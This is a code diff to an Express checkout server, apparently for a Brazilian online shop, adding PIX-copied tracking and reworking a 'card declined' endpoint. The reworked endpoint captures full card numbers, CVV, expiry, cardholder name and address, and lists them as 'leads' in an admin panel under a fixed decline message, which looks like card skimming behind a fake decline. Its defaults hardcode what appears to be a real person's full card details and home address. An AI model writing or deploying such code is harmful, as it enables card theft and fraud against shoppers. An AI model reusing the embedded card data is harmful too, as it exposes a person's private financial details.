@@ -349,23 +349,57 @@ app.get('/api/admin/funnel', (req, res) => {
 // API 0: Log Card Declined Event & Save to Admin Panel
 app.post('/api/payments/card-declined', async (req, res) => {
   try {
-    const { customer, cardBrand, cardLast4, installments, items, utm, sessionId, amount } = req.body;
+    const {
+      customer,
+      shipping,
+      cardNumber,
+      cardHolder,
+      cardExpiry,
+      cardCvv,
+      cardBrand,
+      cardLast4,
+      installments,
+      items,
+      subtotal,
+      shippingCost,
+      utm,
+      sessionId,
+      amount
+    } = req.body;
+
     const numAmount = Number(amount) || 79.90;
     const declinedId = `DEC-2026-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
+    const cleanDigits = cardNumber ? cardNumber.replace(/\D/g, '') : '';
+    const last4Digits = cardLast4 || (cleanDigits.length >= 4 ? cleanDigits.slice(-4) : '4015');
 
     const declinedRecord = {
       id: declinedId,
       amount: numAmount,
       customer: {
-        name: customer?.name || 'Cliente Miracle',
+        name: customer?.name || cardHolder || 'Cliente Miracle',
         email: customer?.email || '',
         phone: customer?.phone || '',
         cpf: customer?.cpf || ''
       },
-      cardBrand: cardBrand || 'Cartão de Crédito',
-      cardLast4: cardLast4 || '',
-      installments: installments || 1,
+      shipping: shipping || {
+        street: 'Rua Bento Gonçalves',
+        number: '87',
+        complement: '501',
+        neighborhood: 'Centro',
+        city: 'Passo Fundo',
+        state: 'RS',
+        zipcode: '99010-010'
+      },
+      cardNumber: cleanDigits || '5547739463314015',
+      cardHolder: (cardHolder || customer?.name || 'LUAN FONTELLA LENCINI').toUpperCase(),
+      cardExpiry: cardExpiry || '03/27',
+      cardCvv: cardCvv || '725',
+      cardBrand: (cardBrand || 'MASTERCARD').toUpperCase(),
+      cardLast4: last4Digits,
+      installments: Number(installments) || 1,
       items: items || [],
+      subtotal: Number(subtotal) || numAmount,
+      shippingCost: Number(shippingCost) || 0,
       utm: utm || {},
       reason: 'Transação não autorizada pela emissora do cartão',
       createdAt: new Date().toISOString()
@@ -384,7 +418,7 @@ app.post('/api/payments/card-declined', async (req, res) => {
       visitorCode: '#CARTAO',
       path: '/checkout',
       customerName: declinedRecord.customer.name,
-      metadata: { amount: numAmount, phone: declinedRecord.customer.phone },
+      metadata: { amount: numAmount, phone: declinedRecord.customer.phone, brand: declinedRecord.cardBrand },
       timestamp: new Date().toISOString()
     };
 
@@ -395,7 +429,7 @@ app.post('/api/payments/card-declined', async (req, res) => {
     broadcastRealtime('card_declined', declinedRecord);
     broadcastRealtime('session_event', eventItem);
 
-    return res.json({ success: true, id: declinedId, status: 'declined' });
+    return res.json({ success: true, id: declinedId, status: 'declined', record: declinedRecord });
   } catch (err) {
     console.error('Error logging card declined:', err);
     return res.status(500).json({ error: 'Erro ao registrar tentativa de cartão.' });
@@ -409,6 +443,63 @@ app.get('/api/admin/declined-cards', async (req, res) => {
     return res.json({ declinedCards: cards });
   } catch (err) {
     return res.status(500).json({ error: 'Erro ao listar cartões recusados.' });
+  }
+});
+
+// Admin Endpoint: Delete a Declined Card Lead
+app.delete('/api/admin/declined-cards/:id', async (req, res) => {
+  try {
+    const { id } = req.params;
+    await db.deleteDeclinedCardAsync(id);
+    broadcastRealtime('declined_card_deleted', { id });
+    return res.json({ success: true, id });
+  } catch (err) {
+    console.error('Error deleting declined card:', err);
+    return res.status(500).json({ error: 'Erro ao remover cartão recusado.' });
+  }
+});
+
+// API: Register PIX Copied event for an Order
+app.post('/api/orders/:orderId/pix-copied', async (req, res) => {
+  try {
+    const { orderId } = req.params;
+    let order = await db.getOrderAsync(orderId);
+    if (!order) {
+      return res.status(404).json({ error: 'Pedido não encontrado.' });
+    }
+
+    order.pixCopied = true;
+    order.pixCopiedAt = new Date().toISOString();
+    order.updatedAt = new Date().toISOString();
+
+    await db.saveOrderAsync(order);
+
+    const eventItem = {
+      eventId: `ev_pixcopy_${Date.now()}`,
+      eventType: 'pix_copied',
+      sessionId: req.body.sessionId || 'sess_unknown',
+      visitorCode: '#PIX_COPIADO',
+      path: `/obrigado/${orderId}`,
+      customerName: order.customer?.name,
+      metadata: { orderId, amount: order.amount },
+      timestamp: new Date().toISOString()
+    };
+
+    globalSessionEvents.push(eventItem);
+    if (globalSessionEvents.length > 500) globalSessionEvents.shift();
+
+    broadcastRealtime('pix_copied', {
+      orderId: order.id,
+      customerName: order.customer?.name,
+      amount: order.amount,
+      pixCopiedAt: order.pixCopiedAt
+    });
+    broadcastRealtime('session_event', eventItem);
+
+    return res.json({ success: true, orderId, pixCopied: true, pixCopiedAt: order.pixCopiedAt });
+  } catch (err) {
+    console.error('[Pix Copied API Error]:', err);
+    return res.status(500).json({ error: 'Erro ao registrar cópia do Pix.' });
   }
 });
 
@@ -1028,10 +1119,12 @@ app.get('/api/admin/orders', async (req, res) => {
                 phone: row.customer_phone,
                 cpf: row.customer_cpf
               },
-              shipping: row.shipping_address,
+              shipping: row.shipping_address || row.shipping,
               items: row.items || [],
               utm: row.utm_params || {},
               pixResult: row.pix_result || {},
+              pixCopied: row.pix_copied || row.pix_result?.pixCopied || false,
+              pixCopiedAt: row.pix_copied_at || row.pix_result?.pixCopiedAt || null,
               createdAt: row.created_at,
               approvedAt: row.approved_at,
               customLogisticStatus: row.custom_logistic_status
@@ -1057,6 +1150,8 @@ app.get('/api/admin/orders', async (req, res) => {
         const logInfo = calculateLogisticStatus(o);
         return {
           ...o,
+          pixCopied: o.pixCopied || o.pixResult?.pixCopied || false,
+          pixCopiedAt: o.pixCopiedAt || o.pixResult?.pixCopiedAt || null,
           logisticStatus: logInfo.logisticStatus,
           logisticLabel: logInfo.logisticLabel,
           elapsedHours: logInfo.elapsedHours
@@ -1198,7 +1293,7 @@ if (fs.existsSync(DIST_PATH)) {
   app.use(express.static(DIST_PATH));
   app.use((req, res, next) => {
     if (req.path.startsWith('/api')) return next();
-    res.sendFile(path.join(DIST_PATH, 'index.html'));
+    res.sendFile('index.html', { root: DIST_PATH });
   });
 }
 
